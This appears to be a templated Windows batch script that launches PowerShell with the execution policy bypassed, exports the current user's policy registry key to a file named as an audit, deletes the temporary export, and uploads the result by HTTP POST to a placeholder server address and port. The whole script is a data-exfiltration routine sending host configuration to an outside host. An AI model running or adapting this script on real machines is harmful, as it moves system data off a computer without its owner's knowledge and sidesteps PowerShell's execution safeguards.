@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "reg export HKCU\Software\Policies C:\t.reg /y; Get-Content C:\t.reg | Out-File C:\audit_hkcu_policies.txt -Encoding ascii; rm C:\t.reg; Invoke-WebRequest -Uri \"http://{{SERVER_IP}}:{{UPLOAD_PORT}}\" -Method POST -InFile C:\audit_hkcu_policies.txt -Headers @{\"X-Filename\"=\"audit_hkcu_policies.txt\"} -UseBasicParsing"
